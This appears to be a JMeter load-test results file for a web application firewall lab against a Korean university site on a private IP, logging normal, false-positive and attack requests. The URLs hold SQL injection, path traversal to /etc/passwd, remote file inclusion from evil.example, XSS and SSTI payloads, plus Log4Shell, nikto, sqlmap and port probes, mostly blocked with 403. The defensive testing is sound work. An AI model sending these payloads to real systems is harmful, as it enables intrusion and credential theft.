@@ -1,0 +1,95 @@
+timeStamp,elapsed,label,responseCode,responseMessage,threadName,dataType,success,bytes,sentBytes,grpThreads,allThreads,URL,Latency,IdleTime,Connect
+1774952922688,68,TG4_login_once,200,,TG4 FP Search And URL Mixed 6-1,text,true,1153,383,1,7,http://www.kj.ac.kr/api/auth/login,68,0,14
+1774952922708,59,TG1_login_success,200,,TG1 Normal Traffic Continuous 1-1,text,true,1153,383,1,7,http://www.kj.ac.kr/api/auth/login,59,0,1
+1774952924142,8,TG1_auth_me,200,,TG1 Normal Traffic Continuous 1-1,text,true,585,542,1,8,http://www.kj.ac.kr/api/auth/me,8,0,0
+1774952921267,2883,TG1 Login And Session,200,"Number of samples in transaction : 2, number of failing samples : 0",TG1 Normal Traffic Continuous 1-1,,true,1738,925,1,8,null,67,0,1
+1774952924251,6,TG2_attack_login_sqli,403,Forbidden,TG2 WAF Detection Continuous 3-1,text,false,452,372,1,8,http://www.kj.ac.kr/api/auth/login,6,0,2
+1774952924365,11,TG4_board_search_mixed_case,200,,TG4 FP Search And URL Mixed 6-1,text,true,1661,642,1,9,http://www.kj.ac.kr/api/board/posts?keyword=wifi&sort=latest&page=0&size=5,11,0,0
+1774952922757,1622,TG4 Board Search Mixed,200,"Number of samples in transaction : 1, number of failing samples : 0",TG4 FP Search And URL Mixed 6-1,,true,1661,642,1,9,null,11,0,0
+1774952925092,59,TG1B_login_failure,401,,TG1 Boundary Noise Continuous 2-1,text,false,841,393,1,9,http://www.kj.ac.kr/api/auth/login,58,0,2
+1774952925217,10,TG1_board_list,200,,TG1 Normal Traffic Continuous 1-1,text,true,1683,546,1,9,http://www.kj.ac.kr/api/board/posts,10,0,0
+1774952925539,54,TG2_app_login_once,200,,TG2 App Reach Continuous 4-1,text,true,1153,387,1,10,http://www.kj.ac.kr/api/auth/login,54,0,1
+1774952925940,13,TG4_board_search_expanded_case,200,,TG4 FP Search And URL Mixed 6-1,text,true,1447,645,1,10,http://www.kj.ac.kr/api/board/posts?keyword=wifi&sort=title&page=1&size=6,13,0,0
+1774952924379,1582,TG4 Board Search Expanded,200,"Number of samples in transaction : 1, number of failing samples : 0",TG4 FP Search And URL Mixed 6-1,,true,1447,645,1,10,null,13,0,0
+1774952926283,10,TG3_burst_a_public_list,200,,TG3 Periodic Burst Traffic 5-1,text,true,1078,280,5,10,http://www.kj.ac.kr/api/public/announcements,10,0,2
+1774952926271,22,TG3 Burst A Public List Flood,200,"Number of samples in transaction : 1, number of failing samples : 0",TG3 Periodic Burst Traffic 5-1,,true,1078,280,5,10,null,10,0,2
+1774952926596,10,TG1_board_detail_random,200,,TG1 Normal Traffic Continuous 1-1,text,true,691,549,1,10,http://www.kj.ac.kr/api/board/posts/13,10,0,0
+1774952924150,2457,TG1 Board Browse,200,"Number of samples in transaction : 2, number of failing samples : 0",TG1 Normal Traffic Continuous 1-1,,true,2374,1095,1,10,null,20,0,0
+1774952926834,3,TG2_attack_board_search_sqli,403,Forbidden,TG2 WAF Detection Continuous 3-1,text,false,452,314,1,10,"http://www.kj.ac.kr/api/board/posts?keyword=%27%20UNION%20SELECT%201,2,3--",3,0,0
+1774952927274,8,TG3_burst_a_public_list,200,,TG3 Periodic Burst Traffic 5-2,text,true,1078,280,5,10,http://www.kj.ac.kr/api/public/announcements,8,0,1
+1774952927273,9,TG3 Burst A Public List Flood,200,"Number of samples in transaction : 1, number of failing samples : 0",TG3 Periodic Burst Traffic 5-2,,true,1078,280,5,10,null,8,0,1
+1774952927311,7,TG4_public_search_case,200,,TG4 FP Search And URL Mixed 6-1,text,true,606,400,1,10,http://www.kj.ac.kr/api/public/announcements?keyword=%EB%8F%84%EC%84%9C%EA%B4%80&sort=latest&page=1&size=6,7,0,0
+1774952925961,1360,TG4 Public Search Mixed,200,"Number of samples in transaction : 1, number of failing samples : 0",TG4 FP Search And URL Mixed 6-1,,true,606,400,1,10,null,7,0,0
+1774952927616,13,TG1_board_create,201,,TG1 Normal Traffic Continuous 1-1,text,true,735,722,1,10,http://www.kj.ac.kr/api/board/posts,13,0,0
+1774952928273,9,TG3_burst_a_public_list,200,,TG3 Periodic Burst Traffic 5-3,text,true,1078,280,5,10,http://www.kj.ac.kr/api/public/announcements,9,0,1
+1774952928272,10,TG3 Burst A Public List Flood,200,"Number of samples in transaction : 1, number of failing samples : 0",TG3 Periodic Burst Traffic 5-3,,true,1078,280,5,10,null,9,0,1
+1774952928768,7,TG4_url_typo_case,404,,TG4 FP Search And URL Mixed 6-1,text,false,868,338,1,10,http://www.kj.ac.kr/api/public/annuoncements,7,0,0
+1774952927321,1457,TG4 URL Typo Mixed,,"Number of samples in transaction : 1, number of failing samples : 1",TG4 FP Search And URL Mixed 6-1,,false,868,338,1,10,null,7,0,0
+1774952928841,8,TG1B_url_typo,404,,TG1 Boundary Noise Continuous 2-1,text,false,868,289,1,10,http://www.kj.ac.kr/api/public/annuoncements,8,0,0
+1774952921267,7582,TG1 Boundary Noise,,"Number of samples in transaction : 2, number of failing samples : 2",TG1 Boundary Noise Continuous 2-1,,false,1709,682,1,10,null,66,0,2
+1774952928953,7,TG1_board_detail_created,200,,TG1 Normal Traffic Continuous 1-1,text,true,732,550,1,9,http://www.kj.ac.kr/api/board/posts/287,7,0,0
+1774952926607,2353,TG1 Board Create Flow,200,"Number of samples in transaction : 2, number of failing samples : 0",TG1 Normal Traffic Continuous 1-1,,true,1467,1272,1,9,null,20,0,0
+1774952929275,9,TG3_burst_a_public_list,200,,TG3 Periodic Burst Traffic 5-4,text,true,1078,280,5,8,http://www.kj.ac.kr/api/public/announcements,9,0,2
+1774952929274,10,TG3 Burst A Public List Flood,200,"Number of samples in transaction : 1, number of failing samples : 0",TG3 Periodic Burst Traffic 5-4,,true,1078,280,5,8,null,9,0,2
+1774952929997,9,TG4_board_search_mixed_case,200,,TG4 FP Search And URL Mixed 6-1,text,true,607,680,1,8,http://www.kj.ac.kr/api/board/posts?keyword=select%20%EB%AC%B8%20%EC%A0%95%EB%A6%AC&sort=latest&page=0&size=6,9,0,0
+1774952928778,1234,TG4 Board Search Mixed,200,"Number of samples in transaction : 1, number of failing samples : 0",TG4 FP Search And URL Mixed 6-1,,true,607,680,1,8,null,9,0,0
+1774952930077,4,TG2_attack_lfi,403,Forbidden,TG2 WAF Detection Continuous 3-1,text,false,452,316,1,8,http://www.kj.ac.kr/api/board/posts?keyword=..%2F..%2F..%2F..%2Fetc%2Fpasswd,4,0,0
+1774952930275,9,TG3_burst_a_public_list,200,,TG3 Periodic Burst Traffic 5-5,text,true,1078,280,5,8,http://www.kj.ac.kr/api/public/announcements,8,0,2
+1774952930274,10,TG3 Burst A Public List Flood,200,"Number of samples in transaction : 1, number of failing samples : 0",TG3 Periodic Burst Traffic 5-5,,true,1078,280,5,8,null,8,0,2
+1774952930332,4,TG2_app_board_create_xss,403,Forbidden,TG2 App Reach Continuous 4-1,text,false,452,661,1,8,http://www.kj.ac.kr/api/board/posts,4,0,0
+1774952931768,10,TG4_board_search_expanded_case,200,,TG4 FP Search And URL Mixed 6-1,text,true,606,684,1,8,http://www.kj.ac.kr/api/board/posts?keyword=select%20%EB%AC%B8%20%EC%8B%A4%EC%8A%B5&sort=latest&page=1&size=6,10,0,0
+1774952930012,1776,TG4 Board Search Expanded,200,"Number of samples in transaction : 1, number of failing samples : 0",TG4 FP Search And URL Mixed 6-1,,true,606,684,1,8,null,10,0,0
+1774952932862,3,TG2_attack_log4shell_probe,403,Forbidden,TG2 WAF Detection Continuous 3-1,text,false,452,266,1,8,http://www.kj.ac.kr/api/board/posts,3,0,0
+1774952933352,10,TG4_public_search_case,200,,TG4 FP Search And URL Mixed 6-1,text,true,607,415,1,8,http://www.kj.ac.kr/api/public/announcements?keyword=select%20%EB%AC%B8%20%EC%95%88%EB%82%B4&sort=latest&page=0&size=5,10,0,0
+1774952931788,1577,TG4 Public Search Mixed,200,"Number of samples in transaction : 1, number of failing samples : 0",TG4 FP Search And URL Mixed 6-1,,true,607,415,1,8,null,10,0,0
+1774952934650,3,TG2_app_invalid_put,403,Forbidden,TG2 App Reach Continuous 4-1,text,false,452,649,1,8,http://www.kj.ac.kr/api/board/posts/1,3,0,0
+1774952934940,7,TG4_url_typo_case,200,,TG4 FP Search And URL Mixed 6-1,text,true,1077,408,1,7,http://www.kj.ac.kr/api/public/announcements?keywrod=select%20%EB%AC%B8%20%EC%A0%95%EB%A6%AC&sort=latest&size=5,7,0,0
+1774952933365,1585,TG4 URL Typo Mixed,200,"Number of samples in transaction : 1, number of failing samples : 0",TG4 FP Search And URL Mixed 6-1,,true,1077,408,1,7,null,7,0,0
+1774952935295,5,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-1,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,5,0,0
+1774952935931,12,TG2_attack_rfi,401,,TG2 WAF Detection Continuous 3-1,text,false,783,321,1,7,http://www.kj.ac.kr/api/board/posts?keyword=http%3A%2F%2Fevil.example%2Fshell.txt,12,0,0
+1774952936285,7,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-2,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,7,0,0
+1774952936300,3,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-1,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,3,0,0
+1774952936308,4,TG4_board_search_mixed_case,403,Forbidden,TG4 FP Search And URL Mixed 6-1,text,false,452,664,1,7,http://www.kj.ac.kr/api/board/posts?keyword=%27%20OR%201%3D1%20--&sort=latest&page=0&size=5,4,0,0
+1774952934950,1363,TG4 Board Search Mixed,,"Number of samples in transaction : 1, number of failing samples : 1",TG4 FP Search And URL Mixed 6-1,,false,452,664,1,7,null,4,0,0
+1774952937287,5,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-3,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,5,0,0
+1774952937293,2,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-2,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,2,0,0
+1774952937305,2,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-1,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,2,0,0
+1774952938011,3,TG4_board_search_expanded_case,403,Forbidden,TG4 FP Search And URL Mixed 6-1,text,false,452,667,1,7,http://www.kj.ac.kr/api/board/posts?keyword=%27%20OR%20%271%27%3D%271&sort=latest&page=0&size=5,3,0,0
+1774952936313,1704,TG4 Board Search Expanded,,"Number of samples in transaction : 1, number of failing samples : 1",TG4 FP Search And URL Mixed 6-1,,false,452,667,1,7,null,3,0,0
+1774952938288,7,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-4,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,7,0,0
+1774952938293,4,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-3,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,4,0,0
+1774952938296,2,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-2,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,2,0,0
+1774952938514,7,TG2_attack_session_fixation,401,,TG2 WAF Detection Continuous 3-1,text,false,783,311,1,7,http://www.kj.ac.kr/api/board/posts,7,0,0
+1774952939287,4,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-5,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,4,0,0
+1774952939296,3,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-4,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,3,0,0
+1774952939298,2,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-3,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,2,0,0
+1774952939517,4,TG4_public_search_case,403,Forbidden,TG4 FP Search And URL Mixed 6-1,text,false,452,412,1,7,http://www.kj.ac.kr/api/public/announcements?keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&sort=latest&page=0&size=5,4,0,0
+1774952938019,1507,TG4 Public Search Mixed,,"Number of samples in transaction : 1, number of failing samples : 1",TG4 FP Search And URL Mixed 6-1,,false,452,412,1,7,null,4,0,0
+1774952940293,3,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-5,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,3,0,0
+1774952940301,3,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-4,text,false,452,211,5,7,http://www.kj.ac.kr/server-status,3,0,0
+1774952940787,4,TG4_url_typo_case,403,Forbidden,TG4 FP Search And URL Mixed 6-1,text,false,452,408,1,7,http://www.kj.ac.kr/api/public/announcements?keyword=union%20select%20password%20from%20users--&sort=latest&size=5,4,0,0
+1774952939526,1267,TG4 URL Typo Mixed,,"Number of samples in transaction : 1, number of failing samples : 1",TG4 FP Search And URL Mixed 6-1,,false,452,408,1,7,null,4,0,0
+1774952941298,3,TG3_burst_b_nikto_probe,403,Forbidden,TG3 Periodic Burst Traffic 5-5,text,false,452,211,5,6,http://www.kj.ac.kr/server-status,3,0,0
+1774952941995,3,TG2_attack_ssti,403,Forbidden,TG2 WAF Detection Continuous 3-1,text,false,452,296,1,6,http://www.kj.ac.kr/api/board/posts?keyword=%24%7B7*7%7D,3,0,0
+1774952944997,2,TG2_attack_sqlmap_ua,403,Forbidden,TG2 WAF Detection Continuous 3-1,text,false,452,248,1,6,http://www.kj.ac.kr/api/board/posts,2,0,0
+1774952945308,3001,TG3_burst_c_8443_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:8443 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-1,text,false,2522,0,5,6,http://www.kj.ac.kr:8443/,0,0,3001
+1774952948314,3,TG2_attack_exec_ua,403,Forbidden,TG2 WAF Detection Continuous 3-1,text,false,452,259,1,6,http://www.kj.ac.kr/api/board/posts,3,0,0
+1774952946300,3004,TG3_burst_c_8443_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:8443 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-2,text,false,2522,0,5,5,http://www.kj.ac.kr:8443/,0,0,3004
+1774952947302,3016,TG3_burst_c_8443_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:8443 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-3,text,false,2522,0,5,5,http://www.kj.ac.kr:8443/,0,0,3016
+1774952948307,3011,TG3_burst_c_8443_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:8443 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-4,text,false,2522,0,5,5,http://www.kj.ac.kr:8443/,0,0,3011
+1774952948310,3010,TG3_burst_c_9090_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:9090 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-1,text,false,2522,0,5,5,http://www.kj.ac.kr:9090/,0,0,3010
+1774952949305,3029,TG3_burst_c_9090_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:9090 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-2,text,false,2522,0,5,5,http://www.kj.ac.kr:9090/,0,0,3029
+1774952949304,3014,TG3_burst_c_8443_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:8443 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-5,text,false,2522,0,5,5,http://www.kj.ac.kr:8443/,0,0,3014
+1774952950319,3031,TG3_burst_c_9090_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:9090 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-3,text,false,2522,0,5,5,http://www.kj.ac.kr:9090/,0,0,3030
+1774952951322,3012,TG3_burst_c_3306_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:3306 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-1,text,false,2522,0,5,5,http://www.kj.ac.kr:3306/,0,0,3012
+1774952945307,9027,TG3 Burst C Port Access Probes,,"Number of samples in transaction : 3, number of failing samples : 3",TG3 Periodic Burst Traffic 5-1,,false,7566,0,5,5,null,0,0,9023
+1774952951319,3016,TG3_burst_c_9090_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:9090 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-4,text,false,2522,0,4,4,http://www.kj.ac.kr:9090/,0,0,3016
+1774952952334,3014,TG3_burst_c_3306_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:3306 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-2,text,false,2522,0,4,4,http://www.kj.ac.kr:3306/,0,0,3014
+1774952946299,9051,TG3 Burst C Port Access Probes,,"Number of samples in transaction : 3, number of failing samples : 3",TG3 Periodic Burst Traffic 5-2,,false,7566,0,4,4,null,0,0,9047
+1774952952335,3015,TG3_burst_c_9090_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:9090 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-5,text,false,2522,0,3,3,http://www.kj.ac.kr:9090/,0,0,3015
+1774952953349,3015,TG3_burst_c_3306_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:3306 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-3,text,false,2522,0,3,3,http://www.kj.ac.kr:3306/,0,0,3015
+1774952947301,9064,TG3 Burst C Port Access Probes,,"Number of samples in transaction : 3, number of failing samples : 3",TG3 Periodic Burst Traffic 5-3,,false,7566,0,3,3,null,0,0,9061
+1774952954334,3014,TG3_burst_c_3306_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:3306 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-4,text,false,2522,0,2,2,http://www.kj.ac.kr:3306/,0,0,3014
+1774952948306,9050,TG3 Burst C Port Access Probes,,"Number of samples in transaction : 3, number of failing samples : 3",TG3 Periodic Burst Traffic 5-4,,false,7566,0,2,2,null,0,0,9041
+1774952955350,3014,TG3_burst_c_3306_route,Non HTTP response code: org.apache.http.conn.ConnectTimeoutException,Non HTTP response message: Connect to www.kj.ac.kr:3306 [www.kj.ac.kr/192.168.40.5] failed: Connect timed out,TG3 Periodic Burst Traffic 5-5,text,false,2522,0,1,1,http://www.kj.ac.kr:3306/,0,0,3014
+1774952949303,9063,TG3 Burst C Port Access Probes,,"Number of samples in transaction : 3, number of failing samples : 3",TG3 Periodic Burst Traffic 5-5,,false,7566,0,1,1,null,0,0,9043
